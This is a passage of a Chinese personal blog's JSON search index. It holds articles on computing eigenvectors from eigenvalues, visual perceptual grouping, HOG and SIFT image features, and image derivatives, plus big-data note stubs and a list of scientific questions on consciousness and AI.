一个矩阵乘以一个向量， 就相当于做了一个线性变换。 方向仍然保持不变， 只是拉伸或者压缩一定倍数。 特征向量和特征值的几何本质，其实就是： 空间矢量的旋转和缩放。 线性变换 A 对于特征空间只起到 “扩张 (或者压缩)” 的作用（扩张后还是同样的特征空间） 求解特征向量按照传统解法： 计算特征多项式→求解特征值→求解齐次线性方程组，得出特征向量。 全新的方法： 其中: 为特征值对应特征向量的第个元素; 为矩阵的第个特征向量; 为矩阵的第个余子式,是该主子式的第个特征值. 通过删除原始矩阵的行和列，创建子矩阵。 子矩阵和原始矩阵的特征值组合在一起，就可以计算原始矩阵的特征向量。 简而言之，已知特征值，一个方程式就可以求得特征向量。 参考文献Eigenvectors from Eigenvalues Eigenvalues: the Rosetta Stone for Neutrino Oscillations in Matter","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"},{"name":"线性代数","slug":"Math/线性代数","permalink":"https://blog.mhuig.top/categories/Math/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"},{"name":"线性代数","slug":"线性代数","permalink":"https://blog.mhuig.top/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"},{"name":"特征向量","slug":"特征向量","permalink":"https://blog.mhuig.top/tags/%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/"}]},{"title":"视知觉整合的认知和神经机制研究","slug":"ml/视知觉整合的认知和神经机制研究","date":"2019-10-02T01:00:46.000Z","updated":"2019-10-02T01:00:46.000Z","comments":true,"path":"p/63637a24/","permalink":"https://blog.mhuig.top/p/63637a24/","excerpt":"本文主要探讨知觉整合研究的新视角、轮廓线整合与纹理整合的神经机制以及知觉整合机制待解决的研究问题。","text":"本文主要探讨知觉整合研究的新视角、轮廓线整合与纹理整合的神经机制以及知觉整合机制待解决的研究问题。 知觉整合研究新视角结构极简取向知觉整合理论研究中最有目共睹的研究成果是格式塔思想，其最核心的原则是结构最简化原则，该思想可根据结构极简原则推测出格式塔知觉组织的其他特定原则。 格式塔心理学家认为理解知觉组织原则的关键在于将视网膜图像中的所有结构识别为视觉系统所敏感的知觉结构。 所谓结构极简原则，是指视觉系统将所有可获得信息组合为最简化的表征方式。 Leeuwenberg 提出了一套思想框架，视觉系统通过选择编码语言的最短表达式来描述刺激的可能组织，结构信息理论所负载的最短代码或者是最少信息即最短表达式。 生态学取向结构信息理论能够解释一些知觉组织现象，但是他不能回答的一个重要问题是，为什么视觉系统对某些特定的结构更为敏感。 为什么视觉系统对某些特定的结构敏感性有利于有机体发现外部世界的结构。 知觉整合生态学研究视角有一个普适性的基本原理：不论视觉系统通过哪种方式进行整合，确定哪些部分属于同一整体的判定，其结果更可能是对符合外部世界的真实状态的反应。 Kruer 和 Sigman 等人发现自然场景图像共线、共圆以及平行排布的统计学规律。 相关研究发现自然场景中相邻边缘间最主要的排布方式是对齐分布。首尾相连的线段对出现的概率要远远高于边对边的线段对，而且他们在空间比例不变性维度上有质的差异。 计算模型取向一般来说，计算模型至少包括两个相关的计算理论水平：宏观水平的整体框架以及微观水平的特定机制。 在宏观水平，计算理论的目标是在各种结构类型中找出最适合用于计算观察者所看到结构的整体框架，从而服务于知觉整合分析。 在微观层面，计算理论主要聚焦于具体的计算元素以及元素间的相互关系。与知觉整合相关的一个计算模型来自于环路循环连接网络：一个类似神经元元素组成的前馈和反馈连接的构型。 有研究者进一步推测，大脑的物理格式塔是基于分布在皮层中的动态电磁场。 所谓对称环路循环网络，是指网络中任意单位对之间的双向连接方向都有相同的权重。该网络总会收敛到均衡状态，使得信息约束满足各向同性至物理最小能量。 神经机制研究取向知觉整合神经机制研究的目标是探究促使知觉整合发生的实际神经活动的本质。 以往关于初级视皮层简单神经元本质的研究说明功能和生理学研究相互依赖的最好例子。Hubel 和 Wiesel 在对猫的研究中发现外侧膝状体和初级视皮层中的单个神经元对简单的刺激属性（如朝向、运动方向等）具有选择性反应，他们将此解释为 “特征探测器”（如线条、边缘探测器）。 当研究者在经典感受野内呈现偏好朝向的随机运动点模式时，他们发现神经元反应与运动方向的倒 U 关系（最优朝向反应最强，随着与最优朝向顺时针或逆时针偏转越来越大时，神经元反应越来越小）。 结果表明神经元不仅仅对其感受野内的基本刺激属性有反应，单个神经元活动会受到周围神经元的影响，提示着神经元还表征格式塔的相关属性。 轮廓线整合的神经机制研究者发现初级视皮层中的神经元不仅受到经典感受野内刺激的影响，还受到感受野外刺激的影响，单个神经元的活动会受到神经元之间相互作用的调节。虽然感受野外的线段本身不会诱发神经元的反应，但是当感受野外的线段与感受野内线段成共线关系时，神经元的反应会增强，而且感受野外线段数量越多，其发放强度越大。 Field 等人根据其系列结果提出了 “联合野” 概念，他们的理论认为具有相似朝向选择性的神经元之间会具有选择性的相互作用，当这些神经元的排布方式违反这种规则时，这种促进和抑制的链接使得大脑完成对轮廓线信息的编码。 视觉系统在长期的进化发展过程中受到环境的交互影响，外界环境优化了视觉系统对环境中具有最高统计概率的刺激或刺激模式的反应机制。 研究者提出轮廓整合的神经实现基础是通过初级视皮层神经元间长距离兴奋性连接网络组成的 “联合野” 所实现的，然而最新的研究认为实现 “联合野” 还可能需要来自高级皮层自上而下对初级皮层的反馈作用。 纹理整合的神经机制神经元感受野中的纹理朝向与外周非经典感受野内的纹理朝向成正交关系时，会使得具有朝向信息的纹理边界线被 “朝向对抗” 神经元探测到。 目前 “朝向对抗” 神经元还没有被证实。 研究提示，各层级视皮层的前馈和水平投射可以对感受野内进行中心 - 外周比较，从而使得早期视皮层实现对较小空间范围内的同向抑制，较高级视皮层实现对较大空间范围内的同向抑制；反馈连接则将较高级皮层的区域填充信号反馈传回到低级视皮层实现同向兴奋。 研究者在多分层的层级视觉框架中通过多个空间尺度的特征地图架构了纹理分隔计算模型，实现了对纹理分隔任务的加工。 关于图形背景分割两阶段理论：该理论提出的第一个阶段是边界探测，纹理定义的边界线首先由具有相似偏好神经元间的相互抑制机制所探测到，该理论得到了实验证据的支持，研究者发现初级和较高级视皮质表层的神经元在很短时间内对图形边界的反应更强。第二个阶段是区域填充，该模型的区域填充过程始于存在于视觉系统多个空间尺度中的特征探测器，然后这些神经元会将信号反馈回早期视皮层的神经元，区域填充的结果是初级视皮层以活动增强的方式表征图像区域。研究者提出通过 NMDA 受体以及存在反馈链接并投射到第 1 层和第 5 层深层和表层神经元的树突共同作用实现将调制信号限制在激活强度最大的神经元群体，即图像表征区域。通过两种机制的共同作用，视觉系统通过对图形增强背景抑制的编码模式实现对图形背景的分割，从而实现对图形的知觉以及准确完成行为任务。 知觉整合机制待解决的研究问题视知觉整合的加工时程视知觉整合与注意麻醉情况下的无意识状态不能进行轮廓整合 自下而上与自上而下初级视皮层是否表征轮廓信息受限于知觉学习状态，只有当轮廓任务被学习之后，初级视皮层才能表征轮廓信息。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器学习/机器视觉","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"}],"tags":[{"name":"视知觉","slug":"视知觉","permalink":"https://blog.mhuig.top/tags/%E8%A7%86%E7%9F%A5%E8%A7%89/"}]},{"title":"视知觉整合","slug":"ml/视知觉整合","date":"2019-10-01T11:51:37.000Z","updated":"2019-10-01T11:51:37.000Z","comments":true,"path":"p/4c2deb5e/","permalink":"https://blog.mhuig.top/p/4c2deb5e/","excerpt":"为了满足生存和生活的需要，人类需随时对外界环境中的客体信息进行高效地识别并与之产生交互。然而，由于视觉系统的固有组织属性，视觉系统必须提供一个强有力的机制快速地从海量的碎片式信息中准确识别出目标客体，这是视觉系统面临的一大挑战。","text":"为了满足生存和生活的需要，人类需随时对外界环境中的客体信息进行高效地识别并与之产生交互。然而，由于视觉系统的固有组织属性，视觉系统必须提供一个强有力的机制快速地从海量的碎片式信息中准确识别出目标客体，这是视觉系统面临的一大挑战。 视知觉整合（visual perceptual grouping）是指视觉系统将场景中属于同一客体或模式的离散元素组合并与其他客体或模式及背景区分的过程。 视知觉整合通常被认为是低级感觉加工和高级知觉加工（如客体、场景或事件加工等）间的功能桥梁。 视知觉整合与知觉组织当视网膜上的信息经由外侧膝状体首次进入初级视觉皮层时，神经元群组会对落在其感受野内的局部信号进行表征，如客体的轮廓线、纹理，在大多数情况下，同一个客体的不同部分会由具有不同调谐属性的神经元来表征。这是由于初级视觉皮层单个神经元的感受野很小且仅编码特定特征，当客体的大小大于单个神经元的感受野范围时，同一个客体的不同部分会由不同神经元来表征。比如，同一个客体的轮廓线会以线段的方式在具有不同朝向调谐属性的神经元来表征。 理论上这会严重破坏视觉信息的完整性，但事实上人们始终能知觉到排列有序的不同客体和背景信息，而不是一堆没有组织结构的局部信息的集合。 在这个过程中，视觉系统所面临的第一个挑战是，人们如何将属于同一个客体的元素从嘈杂的背景中提取整合并与其他客体及背景信息区分开来，即大脑如何完成知觉整合过程。 知觉整合对客体识别及其与环境交互都很重要。视觉系统的内在结构属性使得外界信息始于碎片式表征，然而我们最终知觉到的是排布有序的外部世界。 研究表明灵长类动物在刺激出现后 150ms 内即可识别出自然场景中的客体，一种观点认为这是因为视觉系统具有一套强有力的机制能高效完成整合。 视觉系统面临的最首要的知觉组织问题是判断视网膜上的哪些色块或者亮度块集合属于同一个或同一群客体。 在视觉系统加工的过程中，视觉系统首先需要将输入的离散信号准确地组织为后续信息加工的整体单元，即知觉组织加工。知觉组织是后续客体识别、注意分配等高级加工的基础。 研究历史1923 年，韦德海默提出了知觉组织和知觉整合问题，试图阐述清楚知觉组织最根本的定律。最具有普世性的核心定律是所谓的极简定律，即大脑具有看见最简单形状的倾向。 20 世纪五六十年代，视觉科学有了革命性的发展，尤其是单细胞电生理记录技术和计算模型的发展。Hubel 和 Wiesel 等人发现初级视皮层的神经元对基本视觉特征（如特定方向的边缘）具有选择性反应。 Campbell 等人使用线性系统方法对视觉加工过程进行建模并取得了很大进展。 当代知觉组织研究还发展出了新的间接测量方法，并从实验心理学中借鉴了标准的测量范式，在测量指标上，借鉴了心理物理学的阈值和无偏差反应指标等。 当代视知觉整合研究进展共同区域律共同区域律是指观察者会倾向于将同一个边界范围内的元素知觉为整体。 具体来说，当离散元素处于同一个连续同质的颜色或纹理空间区域内，或处于同一个边界线内，这些离散元素会基于共同区域进行整合，从而被知觉为整体。 如果两个元素都处于同一个图像区域内，那么同偶然出现在一个空间区域内的元素相比，这两个元素属于同一个客体的概率更高。 元素连通律当两个元素间存在第三个元素将其联通时，观察者会倾向于将这两个元素知觉为整体，即所谓的元素连通律。 同步律亮度或运动方向的共同性会诱发整合。 研究还发现即便元素运动方向不相关，元素间也能根据他们在出现时间上的同步性进行整合。 同步律是新的整合原则，不能被已知的视觉机制所解释，并存在争议。 当代知觉整合范式的研究进展早期知觉整合研究通过简单图片分别研究整合的关键因素，然而日常生活中的视觉场景并不是如此简单。 外部世界的典型视觉场景投影在视网膜形成二维图像，该图像由不同的亮度、颜色、形状、纹理等大量图形元素组成。其中边界线为客体的二维和三维形状提供了至关重要的信息。对于连通的没有受遮挡的客体来说，客体的边缘线在视网膜上投射为简单的闭合曲线，该曲线本身即足以形成完整的二维至三维形状知觉。 然而，视觉场景中经常存在遮挡，或存在客体与背景的亮度或颜色对比度低等情况，导致投射在视网膜上的轮廓线线段就已经变得碎片化了，而且因为视觉系统自身的固有结构属性，这种零碎的信息在大脑中呈碎片化表征。为完成识别，视觉系统需将轮廓线线段进行整合。此外，作为替代方案，区域整合也为也为客体识别提供了重要的线索，即视觉系统将轮廓线内部的刺激信息根据相似性原则进行整合。 不论是轮廓边界线还是区块纹理，信息首先进入初级视觉皮层都是碎片化式的表征，那么视觉系统面临的一个根本的重要任务是如何将这些信息重组成我们所感知到的排列有序的客体知觉。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器学习/机器视觉","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"}],"tags":[{"name":"视知觉","slug":"视知觉","permalink":"https://blog.mhuig.top/tags/%E8%A7%86%E7%9F%A5%E8%A7%89/"}]},{"title":"","slug":"notes/Django","date":"2019-09-21T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-django/","permalink":"https://blog.mhuig.top/p/notes-django/","excerpt":"","text":".fa-secondary{opacity:.4} Django Django 开始阅读","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/categories/Web/"},{"name":"Django","slug":"Web/Django","permalink":"https://blog.mhuig.top/categories/Web/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.mhuig.top/tags/Django/"}]},{"title":"","slug":"notes/CentOS","date":"2019-09-19T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-centos/","permalink":"https://blog.mhuig.top/p/notes-centos/","excerpt":"","text":"CentOS CentOS 开始阅读","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"CentOS","slug":"操作系统/CentOS","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/CentOS/"}],"tags":[{"name":"CentOS","slug":"CentOS","permalink":"https://blog.mhuig.top/tags/CentOS/"}]},{"title":"","slug":"notes/Echarts","date":"2019-09-19T07:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-echarts/","permalink":"https://blog.mhuig.top/p/notes-echarts/","excerpt":"","text":".fa-secondary{opacity:.4} Echarts Echarts 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Echarts","slug":"大数据/Echarts","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Echarts/"}],"tags":[{"name":"Echarts","slug":"Echarts","permalink":"https://blog.mhuig.top/tags/Echarts/"}]},{"title":"","slug":"notes/Azkaban","date":"2019-09-19T06:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-azkaban/","permalink":"https://blog.mhuig.top/p/notes-azkaban/","excerpt":"","text":".fa-secondary{opacity:.4} Azkaban Azkaban 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Azkaban","slug":"大数据/Azkaban","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Azkaban/"}],"tags":[{"name":"Azkaban","slug":"Azkaban","permalink":"https://blog.mhuig.top/tags/Azkaban/"}]},{"title":"","slug":"notes/Sqoop","date":"2019-09-19T05:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-sqoop/","permalink":"https://blog.mhuig.top/p/notes-sqoop/","excerpt":"","text":".fa-secondary{opacity:.4} Sqoop Sqoop 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Sqoop","slug":"大数据/Sqoop","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Sqoop/"}],"tags":[{"name":"Sqoop","slug":"Sqoop","permalink":"https://blog.mhuig.top/tags/Sqoop/"}]},{"title":"","slug":"notes/Kafka","date":"2019-09-19T04:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-kafka/","permalink":"https://blog.mhuig.top/p/notes-kafka/","excerpt":"","text":".fa-secondary{opacity:.4} Kafka Kafka 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Kafka","slug":"大数据/Kafka","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Kafka/"}],"tags":[{"name":"Kafka","slug":"Kafka","permalink":"https://blog.mhuig.top/tags/Kafka/"}]},{"title":"","slug":"notes/Flume","date":"2019-09-19T02:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-flume/","permalink":"https://blog.mhuig.top/p/notes-flume/","excerpt":"","text":".fa-secondary{opacity:.4} Flume Flume 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Flume","slug":"大数据/Flume","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Flume/"}],"tags":[{"name":"Flume","slug":"Flume","permalink":"https://blog.mhuig.top/tags/Flume/"}]},{"title":"","slug":"notes/Hive","date":"2019-09-19T01:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-hive/","permalink":"https://blog.mhuig.top/p/notes-hive/","excerpt":"","text":".fa-secondary{opacity:.4} Hive Hive 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Hive","slug":"大数据/Hive","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive/"}],"tags":[{"name":"Hive","slug":"Hive","permalink":"https://blog.mhuig.top/tags/Hive/"}]},{"title":"","slug":"notes/Hadoop","date":"2019-09-19T00:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-hadoop/","permalink":"https://blog.mhuig.top/p/notes-hadoop/","excerpt":"","text":".fa-secondary{opacity:.4} Hadoop Hadoop 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Hadoop","slug":"大数据/Hadoop","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hadoop/"}],"tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"https://blog.mhuig.top/tags/Hadoop/"}]},{"title":"","slug":"notes/Zookeeper","date":"2019-09-18T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-zookeeper/","permalink":"https://blog.mhuig.top/p/notes-zookeeper/","excerpt":"","text":".fa-secondary{opacity:.4} Zookeeper Zookeeper 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Zookeeper","slug":"大数据/Zookeeper","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Zookeeper/"}],"tags":[{"name":"Zookeeper","slug":"Zookeeper","permalink":"https://blog.mhuig.top/tags/Zookeeper/"}]},{"title":"特征和分类器","slug":"ml/特征和分类器","date":"2019-09-12T03:19:19.000Z","updated":"2019-09-12T03:19:19.000Z","comments":true,"path":"p/483290b5/","permalink":"https://blog.mhuig.top/p/483290b5/","excerpt":"特征提取和分类是典型计算机视觉系统的两个关键阶段。 视觉系统的准确性、稳健性和效率在很大程度上取决于图像特征，和分类器的质量。因此，目标是从输入图像中提取信息丰富的、可靠的特征，以便能够开发出很大程度上独立于领域理论的分类。","text":"特征提取和分类是典型计算机视觉系统的两个关键阶段。 视觉系统的准确性、稳健性和效率在很大程度上取决于图像特征，和分类器的质量。因此，目标是从输入图像中提取信息丰富的、可靠的特征，以便能够开发出很大程度上独立于领域理论的分类。 特征特征是任何独特的方面或特性，用于解决与特定应用相关的计算任务。 n 个特征的组合可以表示成 n 维向量，称为特征向量。特征向量的质量取决于其区分不同类别的图像样本的能力。 来自同一类的图像样本应该有相似的特征值，来自不同类的图像应具有不同的特征值。 分类器分类器是现代计算机视觉和模式识别的核心。 分类器的任务是使用特征向量对图像或感兴趣区域（RoI）划分类别。 分类任务的困难程度取决于来自相同类别的图像的特征值的可变性，以及相对于来自不同类别图像的特征值的差异性。 但是，完美的分类性能通常是不可能的。这主要是因为： 噪声（以阴影、遮挡、透视扭曲等形式） 异常值 模糊性 缺少标签 仅有小训练样本可用 训练数据样本中正 / 负覆盖的不平衡 传统特征描述符传统（手工设计）特征提取方法可分为两大类： 全局 局部 全局特征提取方法定义了一组有效描述整个图像的全局特征。因此形状细节被忽略。全局特征也不适用于识别部分遮挡的对象。 局部特征提取方法提取关键点周围的局部区域，由此可以更好的处理遮挡。 检测关键点，并在他们周围构建描述符的方法： 局部描述符（如 HOG、SIFT、SURF、FREAK、ORB、BRISK、BRIEF、LIOP） 方向梯度直方图HOG 是一个特征描述符，用于自动检测图像中的对象。HOG 描述符对图像中局部部分的梯度方向的分布进行编码。 HOG 背后的想法是可以通过边缘方向的直方图来描述图像内的对象外观和形状。 1. 梯度计算第一步是计算梯度值。在图像的水平和垂直方向上，执行一维中心点离散微分模板。具体的说，该方法需要用以下滤波器内核处理灰度图像： 因此给定一个图像，以下卷积操作（表示为 ）得出图像在和方向的导数： 因此，梯度的方向和梯度的大小计算如下： CNN 也在层中使用卷积运算，然而主要区别在于不使用手工设计的滤波器，CNN 使用可训练的滤波器，使其具有高度的自适应性。 CNN 也在层中使用卷积运算，然而主要区别在于不使用手工设计的滤波器，CNN 使用可训练的滤波器，使其具有高度的自适应性。 2. 单元方向直方图第二步是计算单元直方图。首先将图像分成小的（通常是 8X8 像素）单元。每个单元都有固定数量的梯度方向区间，他们均匀分布在 。或 。之间，具体取决于梯度是有符号的还是无符号的。 单元内的每一个像素基于该像素处梯度的模对每一个梯度方向区间偷加权票。对于投票权重，可以是梯度大小，梯度大小的平方根或梯度大小的平方。 3. 描述符块为了处理光照和对比度的变化，通过将单元组合在一起形成更大的空间上相连的块，局部的归一化梯度强度。然后，HOG 描述符是来自所有块区域内的、归一化的单元直方图部件的向量。 4. 块的归一化最后一步是块描述符的归一化。设 v 是包含给定块中所有直方图的非归一化向量，‖为它的 (k) 阶范数（(k = 1,2) ），(\\epsilon) 是一个小常量。归一化因子可以是如下之一： 范数或者 范数或者 范数平方根还有另一个归一化因子 L2-Hys, 它通过削减 v 的 L2 范数得到（将 v 的最大值限制为 0.2），然后重新归一化。 最终的图像 / RoI 描述符是通过连接所有归一化的块描述符而形成的。 L2 范数、L2-Hys 和 L1 范数平方根（L1-sqrt）归一化方法提供了类似的性能，而 L1 范数提供了可靠性稍差的性能。 尺度不变特征变换SIFT [Lowe,2004] 提供了一组对象的特征，这些特征对于对象缩放和旋转是健壮的。 SIFT 算法由四个主要步骤组成。 1. 尺度空间的极值侦测第一步旨在确定对缩放和方向不变的潜在关键点。 SIFT 使用高斯差分（DoG）来检测尺度空间中关键点中的位置。 高斯差分是将两个不同尺度的图像（其中一个尺度为,另一个是其 k 倍，即 ）的高斯模糊进行差分得到的。 2. 关键点精确定位3. 方向定位4. 关键点描述符","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器学习/机器视觉","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器视觉","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"},{"name":"分类器","slug":"分类器","permalink":"https://blog.mhuig.top/tags/%E5%88%86%E7%B1%BB%E5%99%A8/"},{"name":"特征","slug":"特征","permalink":"https://blog.mhuig.top/tags/%E7%89%B9%E5%BE%81/"}]},{"title":"图像导数","slug":"ml/图像导数","date":"2019-09-12T02:29:46.000Z","updated":"2019-09-12T02:29:46.000Z","comments":true,"path":"p/9bc3b11e/","permalink":"https://blog.mhuig.top/p/9bc3b11e/","excerpt":"在图像中，边缘可以看做是位于一阶导数较大的像素处，因此，我们可以求图像的一阶导数来确定图像的边缘，像 sobel 算子等一系列算子都是基于这个思想的。","text":"在图像中，边缘可以看做是位于一阶导数较大的像素处，因此，我们可以求图像的一阶导数来确定图像的边缘，像 sobel 算子等一系列算子都是基于这个思想的。 如下图 a 表示函数在边沿的时候关系，求导得 b 图，可知边沿可就是函数的极值点，对应二阶导数为 0 处，如图 c 的二阶导图。 关于导数总结如下： （1）一阶导数通常图像中产生较粗的边缘 （2）二阶导数对精细细节，如细线、孤立点和噪声有较强的响应 （3）二阶导数在灰度斜坡和灰度台阶过度处会产生双边沿响应 （4）二阶导数的符号可以确定边缘的过渡是从亮到暗还是从暗到亮 （5）选导数提取边沿之前最好是做下图像的平滑，导数对噪声比较敏感","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器学习/机器视觉","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器视觉","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"},{"name":"图像","slug":"图像","permalink":"https://blog.mhuig.top/tags/%E5%9B%BE%E5%83%8F/"},{"name":"数学模型","slug":"数学模型","permalink":"https://blog.mhuig.top/tags/%E6%95%B0%E5%AD%A6%E6%A8%A1%E5%9E%8B/"}]},{"title":"意识、脑与人工智能 十大科学问题","slug":"ml/意识、脑与人工智能十大科学问题","date":"2019-09-12T00:22:25.000Z","updated":"2019-09-12T00:22:25.000Z","comments":true,"path":"p/c270974/","permalink":"https://blog.mhuig.top/p/c270974/","excerpt":"2018 年 9 月，浙江大学发布 “双脑计划”，布局脑科学与人工智能的会聚研究，聚集全校生命科学、信息科学、物质科学和哲学社会科学众多领域的专家学者，开启探索脑认知、意识及智能的本质和规律。2019 年 4 月，浙江大学召开 “意识、脑与人工智能” 圆桌论坛，吴朝晖院士、段树民院士与倪梁康教授（文科资深教授）分别围绕 “意识” 问题，从计算机科学、脑科学、哲学角度作主旨报告，提出了一系列具有挑战性的跨学科问题。在此基础上，浙江大学 “双脑计划” 相关团队组织哲学、计算机科学、神经与脑科学、心理学、社会学等领域专家，聚焦意识与脑、意识与人工智能方面的重大问题，经过反复讨论、不断碰撞、深入凝练，最终提出了十大具有前沿性、挑战性的科学问题，旨在引领国内外学术界的思考，推动意识、脑与人工智能交叉领域的研究。","text":"2018 年 9 月，浙江大学发布 “双脑计划”，布局脑科学与人工智能的会聚研究，聚集全校生命科学、信息科学、物质科学和哲学社会科学众多领域的专家学者，开启探索脑认知、意识及智能的本质和规律。2019 年 4 月，浙江大学召开 “意识、脑与人工智能” 圆桌论坛，吴朝晖院士、段树民院士与倪梁康教授（文科资深教授）分别围绕 “意识” 问题，从计算机科学、脑科学、哲学角度作主旨报告，提出了一系列具有挑战性的跨学科问题。在此基础上，浙江大学 “双脑计划” 相关团队组织哲学、计算机科学、神经与脑科学、心理学、社会学等领域专家，聚焦意识与脑、意识与人工智能方面的重大问题，经过反复讨论、不断碰撞、深入凝练，最终提出了十大具有前沿性、挑战性的科学问题，旨在引领国内外学术界的思考，推动意识、脑与人工智能交叉领域的研究。 “意识、脑与人工智能” 十大科学问题一、意识的生物学基础是什么？意识曾仅是哲学家的研究领域，但随着神经科学发展，科学家逐渐参与到意识本质的研究中。目前大部分观点认为，意识产生的物质基础是神经元，其生物学基础是脑中多个神经网络间的相互作用；也有研究认为意识的产生由相对独立的脑结构（称为意识开关）来主导。意识的生物学基础是什么，及其衍生出来的一系列问题有待进一步探究。例如，意识产生的物质基础是否唯一，能否在神经元以外的物质载体上制造出意识等。 二、“人工意识” 是否可能？从人工智能向人工意识的发展，必须考虑将人工情感和人工意欲的因素纳入人工意识和人工心灵系统的可能性。可尝试通过对神经回路的复杂性的把控来解决所有类型的意识涌现（表象、情感、意志）的复杂性，并在神经系统中找到作为意识之自身觉知（qualia）的对应项。 三、机器如何理解人类的情感表达？在人机共生社会，需要解决机器人与人类的自然交互问题，以使得机器人可以真正融入人们的生活，产生共情、共鸣和自然的社会行为。其中一个重要的挑战是机器如何理解人类的情感表达。 四、强人工智能的心理机制是什么？弱人工智能在解决特定领域问题中，展现出了强大到可以比肩甚至超越人类的能力，但也暴露出通用性弱、学习效率低等一系列问题。解决这些问题需要回归强人工智能的 “初心”，即研究人类智能的心理机制是什么，探索人类为何能利用有限的算力实现通用智能、如何在小数据条件下完成高效学习等问题。 五、意识的信息机制是什么？意识是指一个人体验自身存在的能力，而不仅仅是记录或者像机器人那样对刺激做出反应。研究意识的信息处理机制，需要重点关注信息处理的主观性（subjective）、结构性（structured）、特有性（specific）、统一性（unified）和确定性（definitive）等问题。 